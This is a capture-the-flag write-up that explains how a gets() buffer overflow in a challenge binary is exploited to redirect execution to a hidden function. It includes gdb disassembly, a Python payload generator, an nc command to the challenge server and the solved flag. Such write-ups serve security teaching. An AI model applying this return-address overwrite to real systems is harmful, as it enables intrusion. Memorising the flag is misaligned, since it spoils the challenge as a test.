# Right Address

**Points**: 75

## Solution

This is a stack smashing problem.

Open up the binary in `gdb`. Next find the address of `print_spy_instructions()`:
```gdb
(gdb) disassemble print_spy_instructions
Dump of assembler code for function print_spy_instructions:
   0x08048626 <+0>: push   %ebp
   0x08048627 <+1>: mov    %esp,%ebp
   0x08048629 <+3>: push   %ebx
...
```

The address we need is `0x08048626`.

Since we will be smashing the stack in `process_order()`, let's disassemble
it.

```gdb
Dump of assembler code for function process_order:
   0x080486a8 <+0>: push   %ebp
   0x080486a9 <+1>: mov    %esp,%ebp
   0x080486ab <+3>: push   %ebx
   0x080486ac <+4>: sub    $0x74,%esp
   0x080486af <+7>: call   0x8048560 <__x86.get_pc_thunk.bx>
   0x080486b4 <+12>:    add    $0x194c,%ebx
   0x080486ba <+18>:    movl   $0x0,-0xc(%ebp)
   0x080486c1 <+25>:    mov    0x8(%ebp),%eax
   0x080486c4 <+28>:    sub    $0x1,%eax
   0x080486c7 <+31>:    mov    0x3c(%ebx,%eax,4),%eax
   0x080486ce <+38>:    sub    $0x8,%esp
   0x080486d1 <+41>:    push   %eax
   0x080486d2 <+42>:    lea    -0x15a3(%ebx),%eax
   0x080486d8 <+48>:    push   %eax
   0x080486d9 <+49>:    call   0x8048460 <printf@plt>
   0x080486de <+54>:    add    $0x10,%esp
   0x080486e1 <+57>:    sub    $0xc,%esp
   0x080486e4 <+60>:    lea    -0x158b(%ebx),%eax
   0x080486ea <+66>:    push   %eax
   0x080486eb <+67>:    call   0x8048460 <printf@plt>
   0x080486f0 <+72>:    add    $0x10,%esp
   0x080486f3 <+75>:    sub    $0xc,%esp
   0x080486f6 <+78>:    lea    -0x70(%ebp),%eax
   0x080486f9 <+81>:    push   %eax
   0x080486fa <+82>:    call   0x8048470 <gets@plt>
   0x080486ff <+87>:    add    $0x10,%esp
   0x08048702 <+90>:    sub    $0xc,%esp
   0x08048705 <+93>:    lea    -0x1572(%ebx),%eax
   0x0804870b <+99>:    push   %eax
   0x0804870c <+100>:   call   0x80484a0 <puts@plt>
   0x08048711 <+105>:   add    $0x10,%esp
   0x08048714 <+108>:   sub    $0xc,%esp
   0x08048717 <+111>:   push   $0x5
   0x08048719 <+113>:   call   0x8048490 <sleep@plt>
   0x0804871e <+118>:   add    $0x10,%esp
   0x08048721 <+121>:   sub    $0xc,%esp
   0x08048724 <+124>:   lea    -0x1564(%ebx),%eax
   0x0804872a <+130>:   push   %eax
   0x0804872b <+131>:   call   0x80484a0 <puts@plt>
   0x08048730 <+136>:   add    $0x10,%esp
   0x08048733 <+139>:   nop
   0x08048734 <+140>:   mov    -0x4(%ebp),%ebx
   0x08048737 <+143>:   leave
   0x08048738 <+144>:   ret
End of assembler dump.
```

Our main point of interest is the call to `gets()`:
```gdb
 0x080486f6 <+78>:    lea    -0x70(%ebp),%eax
 0x080486f9 <+81>:    push   %eax
 0x080486fa <+82>:    call   0x8048470 <gets@plt>
```

Here we can see that we compute the address of `%ebp - 0x70` and store it in
`%eax`. Next we push `%eax` to the stack. In short, we are passing that
computed address to `gets()`. This means that this address is the start address
of `address[]`.

Set a breakpoint at the call to `gets()`:
```gdb
(gdb) break *0x080486fa
Breakpoint 1 at 0x80486fa
```

Run the program. When the breakpoint is reached, run `info frame`:
```gdb
(gdb) info frame
Stack level 0, frame at 0xffffc170:
 eip = 0x80486fa in process_order; saved eip = 0x8048893
 called by frame at 0xffffc2b0
 Arglist at 0xffffc168, args:
 Locals at 0xffffc168, Previous frame's sp is 0xffffc170
 Saved registers:
  ebx at 0xffffc164, ebp at 0xffffc168, eip at 0xffffc16c
```

We can see that:
- The saved `%ebp` is at `0xffffc168` on the stack
  (it happens that the current `%ebp` always points to the value of the saved
  `%ebp`), because that was the last thing pushed to the stack before the
  function was called.
- The saved `%eip` is at `0xffffc16c` on the stack

Alternatively:
- `x $ebp` shows the value in the `%ebp` register (as well as value of the
  memory that it references)
- `x $ebp+4` shows the return address (old EIP) of the current function, because it was
  the second to last thing pushed to the stack before the function was called.
- See https://www.cs.princeton.edu/courses/archive/spring11/cos217/lectures/15AssemblyFunctions.pdf

We want to overwrite `0xffffc16c`. To do this, we have to fill all the values
between the address of `address[]` and `0xffffc16c`. Then we can set the value
at `0xffffc16c` to whatever we want, namely the address of `print_spy_instructions()`.

We can put all this into a Python script:

```python
def addr_little_endian(addr, n_bytes):
    """`to_bytes(4, byteorder='little')` was buggy for some reason"""
    mask = 0xff
    ans = []
    for i in range(n_bytes):
        x = addr & mask
        for j in range(i):
            x = x >> 8

        ans.append(x.to_bytes(1, byteorder='big'))
        mask = mask << 8

    return ans


def main():
    # Answer `1` at the first prompt
    with open('access', 'w') as f:
        f.write("1\n")

    with open('access', 'ab') as f:
        ebp = 0xffffc168
        buf_addr = ebp - 0x70  # 0x080486fa
        eip = 0xffffc16c

        n_fill = eip - buf_addr

        # Overflow buffer and smash the stack
        for i in range(n_fill):
            f.write(b'\xff')

        # Set return address
        addr = 0x08048626
        for b in addr_little_endian(addr, 4):
            f.write(b)


main()
```

To use this:
```bash
python3 main.py
cat access - | nc pwn.osucyber.club 13374
# Hit enter at the first prompt
```

We can then see that the flag is:
`osuctf{1ll_r3turn_wher3_i_w4nt_2}`
